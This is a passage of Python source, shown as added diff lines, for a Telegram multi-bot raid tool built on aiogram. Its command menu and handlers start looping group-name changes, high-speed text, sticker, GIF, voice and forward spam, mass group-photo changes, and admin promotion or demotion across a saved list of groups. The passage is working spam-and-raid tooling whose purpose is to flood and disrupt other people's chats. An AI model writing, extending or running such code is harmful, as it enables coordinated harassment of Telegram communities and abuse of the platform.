+• `!dRAHULnc` ➜ {font("Stop RAHUL NC")}
+
+
+
+• `!spmnc <text>` ➜ {font("Dual action title + text spam")}
+
+
+
+• `!dspmnc` ➜ {font("Stop SPMNC loop")}
+
+
+
+• `!delaync <ms>` ➜ {font("Set title change delay")}
+
+
+
+"""
+
+
+
+        await query.message.edit_text(text, reply_markup=back_kb, parse_mode=ParseMode.MARKDOWN)
+
+
+
+        return await query.answer()
+
+
+
+
+
+
+
+    elif action == "cat_spam":
+
+
+
+        text = f"""
+
+
+
+❤️‍🩹 **{font("SPAM & SLIDE COMMANDS")}**
+
+
+
+
+
+
+
+• `!spm <text>` ➜ {font("High speed text spam loop")}
+
+
+
+• `!dspm` ➜ {font("Stop SPM loops")}
+
+
+
+• `!RAHULspam <text>` ➜ {font("Max length text wrapping spam")}
+
+
+
+• `!dRAHULspam` ➜ {font("Stop RAHUL SPAM")}
+
+
+
+• `!rspm <name>` ➜ {font("Raid text chunk spam")}
+
+
+
+• `!drspm` ➜ {font("Stop RSPM")}
+
+
+
+• `!slidespam <text>` ➜ {font("Lock slide spam on target message")}
+
+
+
+• `!dslidespam` ➜ {font("Stop SlideSpam")}
+
+
+
+• `!forwardspm` ➜ {font("Forward message continuously")}
+
+
+
+• `!dforwardspm` ➜ {font("Stop Forward SPM")}
+
+
+
+• `!dallspm` / `!gdall` ➜ {font("Kill all spam tasks globally")}
+
+
+
+"""
+
+
+
+        await query.message.edit_text(text, reply_markup=back_kb, parse_mode=ParseMode.MARKDOWN)
+
+
+
+        return await query.answer()
+
+
+
+
+
+
+
+    elif action == "cat_media":
+
+
+
+        text = f"""
+
+
+
+📸 **{font("MEDIA & STICKER COMMANDS")}**
+
+
+
+
+
+
+
+• `!makesticker <text>` ➜ {font("Open Sticker Studio generator")}
+
+
+
+• `!tts <text>` ➜ {font("Synthesize spoken audio note")}
+
+
+
+• `!stickerspm` / `!dstickerspm`
+
+
+
+• `!gifspm` / `!dgifspm`
+
+
+
+• `!mediaspm` / `!dmediaspm`
+
+
+
+• `!voicespm` / `!dvoicespm`
+
+
+
+• `!pfp` / `!dpfp` / `!gpfp`
+
+
+
+• `!save` / `!del` / `!gsave`
+
+
+
+• `!delallmedia`
+
+
+
+"""
+
+
+
+        await query.message.edit_text(text, reply_markup=back_kb, parse_mode=ParseMode.MARKDOWN)
+
+
+
+        return await query.answer()
+
+
+
+
+
+
+
+    elif action == "cat_reply":
+
+
+
+        text = f"""
+
+
+
+🥱 **{font("REPLY & REACT COMMANDS")}**
+
+
+
+
+
+
+
+• `!replyRAHUL` / `!dreplyRAHUL`
+
+
+
+• `!react <emoji>` / `!dreact`
+
+
+
+• `!swipe <name>` / `!dswipe`
+
+
+
+• `!targetslide <name>` / `!dtargetslide`
+
+
+
+"""
+
+
+
+        await query.message.edit_text(text, reply_markup=back_kb, parse_mode=ParseMode.MARKDOWN)
+
+
+
+        return await query.answer()
+
+
+
+
+
+
+
+    elif action == "cat_admin":
+
+
+
+        text = f"""
+
+
+
+🤫 **{font("ADMIN & SYSTEM COMMANDS")}**
+
+
+
+
+
+
+
+• `!setmenupic` / `!resetmenupic` ➜ {font("Manage global start menu picture")}
+
+
+
+• `!addgroup` / `!delgroup` / `!listgroup`
+
+
+
+• `!gpromote` / `!gdemote`
+
+
+
+• `!mute` / `!unmute` / `!mutelist`
+
+
+
+• `!addsudo` / `!delsudo` / `!listsudo`
+
+
+
+• `!nuke` / `!startpfp` / `!activebots`
+
+
+
+• `!broadcast <text>` / `!status` / `!ping` / `!on`
+
+
+
+• `!o` / `!leave` / `!dall`
+
+
+
+"""
+
+
+
+        await query.message.edit_text(text, reply_markup=back_kb, parse_mode=ParseMode.MARKDOWN)
+
+
+
+        return await query.answer()
+
+
+
+
+
+
+
+    await query.answer()
+
+
+
+
+
+
+
+@dp.message(Command("addgroup", prefix="-./X!"))
+
+
+
+async def cmd_addgroup(message: types.Message, bot: Bot):
+
+
+
+    if not is_sudo(get_auth_id(message)):
+
+
+
+        return
+
+
+
+    if message.chat.type not in ("group", "supergroup"):
+
+
+
+        return await safe_reply(message, font("Use !addgroup inside the group you want to save."))
+
+
+
+    lord_groups.add(message.chat.id)
+
+
+
+    save_db()
+
+
+
+    await safe_reply(message, font(f"✅ Added this group to Lord list. Total: {len(lord_groups)}"))
+
+
+
+
+
+
+
+@dp.message(Command("delgroup", prefix="-./X!"))
+
+
+
+async def cmd_delgroup(message: types.Message, bot: Bot):
+
+
+
+    if not is_sudo(get_auth_id(message)):
+
+
+
+        return
+
+
+
+    if message.chat.id not in lord_groups:
+
+
+
+        return await safe_reply(message, font("This group is not in the Lord list."))
+
+
+
+    lord_groups.discard(message.chat.id)
+
+
+
+    save_db()
+
+
+
+    await safe_reply(message, font(f"✅ Removed this group from Lord list. Total: {len(lord_groups)}"))
+
+
+
+
+
+
+
+@dp.message(Command("listgroup", prefix="-./X!"))
+
+
+
+async def cmd_listgroup(message: types.Message, bot: Bot):
+
+
+
+    if not is_sudo(get_auth_id(message)):
+
+
+
+        return
+
+
+
+    if not lord_groups:
+
+
+
+        return await safe_reply(message, font("Lord list is empty. Use !addgroup inside a group to add it."))
+
+
+
+    lines = [font("👑 Lord groups:")]
+
+
+
+    for chat_id in sorted(lord_groups):
+
+
+
+        lines.append(f"• {chat_id}")
+
+
+
+    await safe_reply(message, "\n".join(lines))
+
+
+
+
+
+
+
+@dp.message(Command("gpromote", prefix="-./X!"))
+
+
+
+async def cmd_gpromote(message: types.Message, bot: Bot):
+
+
+
+    if not is_sudo(get_auth_id(message)):
+
+
+
+        return
+
+
+
+    target_message = message.reply_to_message
+
+
+
+    if not target_message or not target_message.from_user:
+
+
+
+        return await safe_reply(message, font("Reply to the target user's message with !gpromote."))
+
+
+
+    
+
+
+
+    target_uid = target_message.from_user.id
+
+
+
+    target_name = target_message.from_user.first_name
+
+
+
+    
+
+
+
+    if not lord_groups:
+
+
+
+        return await safe_reply(message, font("⚠️ Lord list is empty! Use !addgroup in groups first."))
+
+
+
+        
+
+
+
+    promoted_count = 0
+
+
+
+    for chat_id in list(lord_groups):
+
+
+
+        for b in bots:
+
+
+
+            try:
+
+
+
+                await set_admin(b, chat_id, target_uid, True)
+
+
+
+                promoted_count += 1
+
+
+
+                break
+
+
+
+            except Exception:
+
+
+
+                pass
+
+
+
+                
+
+
+
+    await safe_reply(message, font(f"👑 Promoted {target_name} across {promoted_count}/{len(lord_groups)} Lord list groups!"))
+
+
+
+
+
+
+
+@dp.message(Command("gdemote", prefix="-./X!"))
+
+
+
+async def cmd_gdemote(message: types.Message, bot: Bot):
+
+
+
+    if not is_sudo(get_auth_id(message)):
+
+
+
+        return
+
+
+
+    target_message = message.reply_to_message
+
+
+
+    if not target_message or not target_message.from_user:
+
+
+
+        return await safe_reply(message, font("Reply to the target user's message with !gdemote."))
+
+
+
+    
+
+
+
+    target_uid = target_message.from_user.id
+
+
+
+    target_name = target_message.from_user.first_name
+
+
+
+    
+
+
+
+    if not lord_groups:
+
+
+
+        return await safe_reply(message, font("⚠️ Lord list is empty! Use !addgroup in groups first."))
+
+
+
+        
+
+
+
+    demoted_count = 0
+
+
+
+    for chat_id in list(lord_groups):
+
+
+
+        for b in bots:
+
+
+
+            try:
+
+
+
+                await set_admin(b, chat_id, target_uid, False)
+
+
+
+                demoted_count += 1
+
+
+
+                break
+
+
+
+            except Exception:
+
+
+
+                pass
+
+
+
+                
+
+
+
+    await safe_reply(message, font(f"🛑 Demoted {target_name} across {demoted_count}/{len(lord_groups)} Lord list groups!"))
+
+
+
+
+
+
+
+@dp.message(Command("nuke", prefix="-./X!"))
+
+
+
+async def cmd_nuke(message: types.Message, bot: Bot):
+
+
+
+    if not is_sudo(get_auth_id(message)):
+
+
+
+        return
+
+
+
+    chat_id = message.chat.id
+
+
+
+    task_dicts = (
+
+
+
+        group_tasks, seq_nc_tasks, keng_tasks, spmnc_tasks, RAHULnc_tasks,
+
+
+
+        slidespam_tasks, spm_loop_tasks, rspm_tasks, RAHULspam_tasks,
+
+
+
+        forwardspm_tasks, sticker_spm_tasks, gif_spm_tasks, media_spm_tasks,
+
+
+
+        voice_spm_tasks, pfp_tasks,
+
+
+
+    )
+
+
+
+    stopped = 0
+
+
+
+    for task_dict in task_dicts:
+
+
+
+        if chat_id in task_dict:
+
+
+
+            val = task_dict.pop(chat_id, None)
+
+
+
+            if isinstance(val, (dict, list, set)):
+
+
+
+                val.clear()
+
+
+
+            stopped += 1
+
+
+
+    swipe_mode.pop(chat_id, None)
+
+
+
+    await safe_reply(message, font(f"🛑 Stopped tracked task state for this chat ({stopped} task groups)."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("on", prefix="-./X!"))
+
+
+
+@dp.message(Command("on", prefix="-./X!"))
+
+
+
+async def cmd_on(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    await safe_reply(message, font("🟢 BOT IS ONLINE AND READY"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("uptime", prefix="-./X!"))
+
+
+
+@dp.message(Command("uptime", prefix="-./X!"))
+
+
+
+async def cmd_uptime(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    await safe_reply(message, font(f"⏱️ **UPTIME:** {get_uptime()}"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("status", prefix="-./X!"))
+
+
+
+@dp.message(Command("status", prefix="-./X!"))
+
+
+
+async def cmd_status(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    active = get_active_groups_info()
+
+
+
+    txt = font(f"📊 **BOT STATUS**\n\n⏱️ **Uptime:** {get_uptime()}\n🌐 **Online Bots:** {len(bots)}\n🔥 **Active Groups/Channels ({len(active)}):**\n")
+
+
+
+    for id in active:
+
+
+
+        txt += f"• `{id}`\n"
+
+
+
+    await safe_reply(message, txt, parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("dall", "gdall", prefix="-./X!"))
+
+
+
+@dp.message(Command("dall", "gdall", prefix="-./X!"))
+
+
+
+async def cmd_stop_all(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_owner(get_auth_id(message)): return await safe_reply(message, font("❌ Only OWNER can do this."))
+
+
+
+    
+
+
+
+    group_tasks.clear()
+
+
+
+    seq_nc_tasks.clear()
+
+
+
+    keng_tasks.clear()
+
+
+
+    spmnc_tasks.clear()
+
+
+
+    RAHULnc_tasks.clear()
+
+
+
+    slidespam_tasks.clear()
+
+
+
+    targetslide_targets.clear()
+
+
+
+    spm_loop_tasks.clear()
+
+
+
+    RAHULspam_tasks.clear()
+
+
+
+    rspm_tasks.clear()
+
+
+
+    forwardspm_tasks.clear()
+
+
+
+    sticker_spm_tasks.clear()
+
+
+
+    gif_spm_tasks.clear()
+
+
+
+    media_spm_tasks.clear()
+
+
+
+    voice_spm_tasks.clear()
+
+
+
+    pfp_tasks.clear()
+
+
+
+    swipe_mode.clear()
+
+
+
+    reply_RAHUL_targets.clear()
+
+
+
+    react_targets.clear()
+
+
+
+    
+
+
+
+    save_db()
+
+
+
+    await safe_reply(message, font("🛑 All operations have been terminated globally."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("snc", "gsnc", "lordsnc", prefix="-./X!"))
+
+
+
+@dp.message(Command("snc", "gsnc", "lordsnc", prefix="-./X!"))
+
+
+
+async def cmd_snc(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    exact_text = get_exact_text(message)
+
+
+
+    if not exact_text: 
+
+
+
+        return await safe_reply(message, font("⚠️ Usage: !snc <text> or !gsnc <text>"))
+
+
+
+    
+
+
+
+    is_lord = command.command.startswith("g") or command.command.startswith("lord")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    
+
+
+
+    for c_id in target_chats:
+
+
+
+        active_bots = []
+
+
+
+        for b in bots:
+
+
+
+            try:
+
+
+
+                member = await b.get_chat_member(c_id, b.id)
+
+
+
+                if member.status not in ['left', 'kicked', 'banned']:
+
+
+
+                    active_bots.append(b)
+
+
+
+            except Exception:
+
+
+
+                pass
+
+
+
+                
+
+
+
+        if active_bots:
+
+
+
+            task_id = str(uuid.uuid4())
+
+
+
+            seq_nc_tasks[c_id] = task_id
+
+
+
+            asyncio.create_task(seq_nc_worker(c_id, exact_text, active_bots, task_id))
+
+
+
+
+
+
+
+    scope_str = f"across {len(target_chats)} Lord list groups!" if is_lord else "in this chat!"
+
+
+
+    await safe_reply(message, font(f"🚀 Sequential Multi-Bot NC started {scope_str}"))
+
+
+
+
+
+
+
+@dp.channel_post(Command("dsnc", "gdsnc", prefix="-./X!"))
+
+
+
+@dp.message(Command("dsnc", "gdsnc", prefix="-./X!"))
+
+
+
+async def cmd_dsnc(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    for c_id in target_chats:
+
+
+
+        stop_task_group(seq_nc_tasks, c_id)
+
+
+
+    await safe_reply(message, font("🛑 Sequential NC stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("nc", "gnc", "lordnc", prefix="-./X!"))
+
+
+
+@dp.message(Command("nc", "gnc", "lordnc", prefix="-./X!"))
+
+
+
+async def cmd_nc(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!nc <name>` or `!gnc <name>`", parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    is_lord = command.command.startswith("g") or command.command.startswith("lord")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    
+
+
+
+    for c_id in target_chats:
+
+
+
+        if c_id not in group_tasks: group_tasks[c_id] = {}
+
+
+
+        for b in bots:
+
+
+
+            task_id = str(uuid.uuid4())
+
+
+
+            group_tasks[c_id][b.id] = task_id
+
+
+
+            asyncio.create_task(nc_loop_worker(b, c_id, command.args.strip(), task_id))
+
+
+
+            
+
+
+
+    scope_str = f"across {len(target_chats)} Lord list groups!" if is_lord else "in this chat!"
+
+
+
+    await safe_reply(message, font(f"🔄 Raid Text NC loop started for `{command.args.strip()}` {scope_str}"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("dnc", "gdnc", prefix="-./X!"))
+
+
+
+@dp.message(Command("dnc", "gdnc", prefix="-./X!"))
+
+
+
+async def cmd_stop_nc(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    for c_id in target_chats:
+
+
+
+        stop_task_group(group_tasks, c_id)
+
+
+
+    await safe_reply(message, font("🛑 Raid Text NC loop stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("emo", "gemo", prefix="-./X!"))
+
+
+
+@dp.message(Command("emo", "gemo", prefix="-./X!"))
+
+
+
+async def cmd_emo(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!emo <text>` or `!gemo <text>`", parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    
+
+
+
+    for c_id in target_chats:
+
+
+
+        if c_id not in group_tasks: group_tasks[c_id] = {}
+
+
+
+        for b in bots:
+
+
+
+            task_id = str(uuid.uuid4())
+
+
+
+            group_tasks[c_id][b.id] = task_id
+
+
+
+            asyncio.create_task(emo_loop_worker(b, c_id, command.args.strip(), task_id))
+
+
+
+    await safe_reply(message, font("🔄 Emoji NC loop started!"))
+
+
+
+
+
+
+
+@dp.channel_post(Command("demo", "gdemo", prefix="-./X!"))
+
+
+
+@dp.message(Command("demo", "gdemo", prefix="-./X!"))
+
+
+
+async def cmd_stop_emo(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    for c_id in target_chats:
+
+
+
+        stop_task_group(group_tasks, c_id)
+
+
+
+    await safe_reply(message, font("🛑 Emoji NC loop stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("kengnc", "gkengnc", prefix="-./X!"))
+
+
+
+@dp.message(Command("kengnc", "gkengnc", prefix="-./X!"))
+
+
+
+async def cmd_kengnc(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!kengnc <name>`", parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    
+
+
+
+    for c_id in target_chats:
+
+
+
+        if c_id not in keng_tasks: keng_tasks[c_id] = {}
+
+
+
+        for b in bots:
+
+
+
+            task_id = str(uuid.uuid4())
+
+
+
+            keng_tasks[c_id][b.id] = task_id
+
+
+
+            asyncio.create_task(keng_loop_worker(b, c_id, command.args.strip(), task_id))
+
+
+
+    await safe_reply(message, font(f"🔺 KENG Name Change loop started for `{command.args.strip()}`!"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("dkengnc", "gdkengnc", prefix="-./X!"))
+
+
+
+@dp.message(Command("dkengnc", "gdkengnc", prefix="-./X!"))
+
+
+
+async def cmd_stop_kengnc(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    for c_id in target_chats:
+
+
+
+        stop_task_group(keng_tasks, c_id)
+
+
+
+    await safe_reply(message, font("🛑 KENG NC loop stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("RAHULnc", "gRAHULnc", prefix="-./X!"))
+
+
+
+@dp.message(Command("RAHULnc", "gRAHULnc", prefix="-./X!"))
+
+
+
+async def cmd_RAHULnc(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!RAHULnc <name>`", parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    
+
+
+
+    for c_id in target_chats:
+
+
+
+        if c_id not in RAHULnc_tasks: RAHULnc_tasks[c_id] = {}
+
+
+
+        for b in bots:
+
+
+
+            task_id = str(uuid.uuid4())
+
+
+
+            RAHULnc_tasks[c_id][b.id] = task_id
+
+
+
+            asyncio.create_task(RAHULnc_loop_worker(b, c_id, command.args.strip(), task_id))
+
+
+
+    await safe_reply(message, font(f"🔺 RAHUL NC loop started for `{command.args.strip()}`!"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("dRAHULnc", "gdRAHULnc", prefix="-./X!"))
+
+
+
+@dp.message(Command("dRAHULnc", "gdRAHULnc", prefix="-./X!"))
+
+
+
+async def cmd_dRAHULnc(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    for c_id in target_chats:
+
+
+
+        stop_task_group(RAHULnc_tasks, c_id)
+
+
+
+    await safe_reply(message, font("🛑 RAHUL NC loop stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("spmnc", "gspmnc", prefix="-./X!"))
+
+
+
+@dp.message(Command("spmnc", "gspmnc", prefix="-./X!"))
+
+
+
+async def cmd_spmnc(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!spmnc <text>`", parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    
+
+
+
+    for c_id in target_chats:
+
+
+
+        if c_id not in spmnc_tasks: spmnc_tasks[c_id] = {}
+
+
+
+        for b in bots:
+
+
+
+            task_id = str(uuid.uuid4())
+
+
+
+            spmnc_tasks[c_id][b.id] = task_id
+
+
+
+            asyncio.create_task(spmnc_worker(b, c_id, command.args.strip(), task_id))
+
+
+
+    await safe_reply(message, font(f"⚡ SPMNC dual-loop started for `{command.args.strip()}`!"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("dspmnc", "gdspmnc", prefix="-./X!"))
+
+
+
+@dp.message(Command("dspmnc", "gdspmnc", prefix="-./X!"))
+
+
+
+async def cmd_stop_spmnc(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    for c_id in target_chats:
+
+
+
+        stop_task_group(spmnc_tasks, c_id)
+
+
+
+    await safe_reply(message, font("🛑 SPMNC loop stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("delaync", prefix="-./X!"))
+
+
+
+@dp.message(Command("delaync", prefix="-./X!"))
+
+
+
+async def cmd_delaync(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    try:
+
+
+
+        if not command.args: raise ValueError
+
+
+
+        val = int(command.args)
+
+
+
+        nc_delays[message.chat.id] = max(10, val)
+
+
+
+        await safe_reply(message, font(f"✅ Name Change delay set to `{val}` ms for this group."), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    except Exception:
+
+
+
+        await safe_reply(message, font("❌ Invalid number."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("save", prefix="-./X!"))
+
+
+
+@dp.message(Command("save", prefix="-./X!"))
+
+
+
+async def cmd_save(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not message.reply_to_message or not message.reply_to_message.photo:
+
+
+
+        return await safe_reply(message, font("⚠️ Reply to a photo with `!save`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    chat_id = message.chat.id
+
+
+
+    photo = message.reply_to_message.photo[-1]
+
+
+
+    folder = os.path.join(os.path.dirname(__file__), 'downloads', str(chat_id))
+
+
+
+    os.makedirs(folder, exist_ok=True)
+
+
+
+    await bot.download(photo, destination=os.path.join(folder, f"{photo.file_unique_id}.jpg"))
+
+
+
+    await safe_reply(message, font("📸 Photo saved locally for this group!"))
+
+
+
+
+
+
+
+@dp.channel_post(Command("del", prefix="-./X!"))
+
+
+
+@dp.message(Command("del", prefix="-./X!"))
+
+
+
+async def cmd_del(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not message.reply_to_message or not message.reply_to_message.photo:
+
+
+
+        return await safe_reply(message, font("⚠️ Reply to the saved photo with `!del`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    uid = message.reply_to_message.photo[-1].file_unique_id
+
+
+
+    target = os.path.join(os.path.dirname(__file__), 'downloads', str(message.chat.id), f"{uid}.jpg")
+
+
+
+    if os.path.exists(target):
+
+
+
+        os.remove(target)
+
+
+
+        await safe_reply(message, font("🗑 Photo deleted from this group's storage!"))
+
+
+
+    else:
+
+
+
+        await safe_reply(message, font("⚠️ This photo is not in the storage."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("gsave", prefix="-./X!"))
+
+
+
+@dp.message(Command("gsave", prefix="-./X!"))
+
+
+
+async def cmd_gsave(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not message.reply_to_message or not message.reply_to_message.photo:
+
+
+
+        return await safe_reply(message, font("⚠️ Reply to a photo with `!gsave`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    photo = message.reply_to_message.photo[-1]
+
+
+
+    await bot.download(photo, destination=os.path.join(global_storage, f"{photo.file_unique_id}.jpg"))
+
+
+
+    await safe_reply(message, font("🌍 Photo saved to GLOBAL storage!"))
+
+
+
+
+
+
+
+@dp.channel_post(Command("delgpfp", prefix="-./X!"))
+
+
+
+@dp.message(Command("delgpfp", prefix="-./X!"))
+
+
+
+async def cmd_delgpfp(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not message.reply_to_message or not message.reply_to_message.photo:
+
+
+
+        return await safe_reply(message, font("⚠️ Reply to the saved photo with `!delgpfp`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    uid = message.reply_to_message.photo[-1].file_unique_id
+
+
+
+    target = os.path.join(global_storage, f"{uid}.jpg")
+
+
+
+    if os.path.exists(target):
+
+
+
+        os.remove(target)
+
+
+
+        await safe_reply(message, font("🗑 Photo deleted from GLOBAL storage!"))
+
+
+
+    else:
+
+
+
+        await safe_reply(message, font("⚠️ This photo is not in the Global storage."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("delallmedia", prefix="-./X!"))
+
+
+
+@dp.message(Command("delallmedia", prefix="-./X!"))
+
+
+
+async def cmd_delallmedia(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_owner(get_auth_id(message)): return await safe_reply(message, font("❌ Only OWNER can do this."))
+
+
+
+    dldir = os.path.join(os.path.dirname(__file__), 'downloads')
+
+
+
+    if os.path.exists(dldir):
+
+
+
+        shutil.rmtree(dldir)
+
+
+
+        os.makedirs(global_storage, exist_ok=True)
+
+
+
+        await safe_reply(message, font("💥 All saved media (global and groups) has been deleted!"))
+
+
+
+    else:
+
+
+
+        await safe_reply(message, font("⚠️ No media folder found."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("gpfp", prefix="-./X!"))
+
+
+
+@dp.message(Command("gpfp", prefix="-./X!"))
+
+
+
+async def cmd_gpfp(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    files = [f for f in os.listdir(global_storage) if f.endswith('.jpg') and not f.startswith("start_pic")]
+
+
+
+    if not files: return await safe_reply(message, font("⚠️ No photos in GLOBAL storage. Use `!gsave` first."), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    info_msg = await message.reply(font("🌍 Updating ALL known group and channel PFPs globally..."), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    success = 0
+
+
+
+    
+
+
+
+    for cid in list(known_chats):
+
+
+
+        if cid > 0: continue
+
+
+
+        pic = random.choice(files)
+
+
+
+        
+
+
+
+        for b in bots:
+
+
+
+            try:
+
+
+
+                await b.set_chat_photo(cid, FSInputFile(os.path.join(global_storage, pic)))
+
+
+
+                success += 1
+
+
+
+                break
+
+
+
+            except Exception: pass
+
+
+
+            
+
+
+
+    await bot.edit_message_text(font(f"✅ Global PFP update complete! Changed successfully in {success} groups/channels."), chat_id=message.chat.id, message_id=info_msg.message_id, parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("pfp", prefix="-./X!"))
+
+
+
+@dp.message(Command("pfp", prefix="-./X!"))
+
+
+
+async def cmd_pfp(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    folder = os.path.join(os.path.dirname(__file__), 'downloads', str(message.chat.id))
+
+
+
+    if not os.path.exists(folder) or not [f for f in os.listdir(folder) if f.endswith('.jpg')]:
+
+
+
+        return await safe_reply(message, font("⚠️ No photos saved for this group. Use `!save` first."), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    task_id = str(uuid.uuid4())[:8]
+
+
+
